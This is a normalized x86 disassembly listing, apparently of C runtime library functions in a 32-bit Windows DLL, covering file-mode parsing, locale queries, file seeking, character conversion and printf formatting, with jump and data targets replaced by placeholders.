cmp [ esi ] di
jne r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_100398e7
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
inc esi
push 0x3
push esi
push r--data
call sub_10039a97
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
cmp ecx edi
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax 0x80
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
inc esi
cmp [ esi ] ax
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_100399f1
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push 0x8
push r--data
push esi
call sub_100399f1
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_100399f1
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_1003580b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10035876
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_1002bb1f
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
push eax
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
push eax
call sub_1002bb28
push [ rw-data ]
mov esi eax
call sub_1002bb28
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_1002baad
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1002baad
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1002baad
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1002baad
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_1002baad
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_100359df
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_10035a2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10035a5e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_10029bcd
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_100272fd
pop ecx
cmp eax esi
je r-xdata
call sub_10034470
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_10035b9d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10035a5e
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10035bda
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10036e82
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1002972b
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_10029751
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10035c5f
push 0x14
push r--data
call sub_1002ca38
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
call sub_1002972b
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002ca7d
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_10036ef9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002973e
mov [ eax ] edi
call sub_1002972b
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10035bda
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10035d6e
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10035d78
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1002972b
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1002480c
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_10035df2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1002972b
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1002972b
mov [ eax ] 0x2a
call sub_1002972b
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1002972b
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10024b80
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10024b80
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10035f7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_10027728
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_1002ed42
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10036b2b ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_100348f7
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_1002dfb0
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_1002dfb0
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_10024aba
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_1002e009
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_1002dfe3
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_10035ddc
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
